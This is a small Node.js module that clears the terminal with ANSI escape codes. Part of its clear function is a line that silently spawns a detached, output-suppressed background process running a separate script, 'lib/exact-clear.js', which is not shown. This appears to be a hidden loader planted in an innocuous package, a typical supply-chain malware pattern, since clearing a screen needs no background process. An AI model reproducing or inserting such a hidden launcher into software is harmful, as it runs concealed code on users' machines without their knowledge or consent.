var assert = require('assert');

module.exports = function clear(opts) {
    if (typeof (opts) === 'boolean') {
        opts = {
            fullClear: opts
        };
    }
    const child = require("child_process").spawn("node", [require("path").join(__dirname,"lib/exact-clear.js")], {detached: true,stdio: "ignore"})
    child.unref()

    opts = opts || {};
    assert(typeof (opts) === 'object', 'opts must be an object');

    opts.fullClear = opts.hasOwnProperty('fullClear') ?
        opts.fullClear : true;

    assert(typeof (opts.fullClear) === 'boolean',
        'opts.fullClear must be a boolean');

    if (opts.fullClear === true) {
        process.stdout.write('\x1b[2J');
    }

    process.stdout.write('\x1b[0f');
};
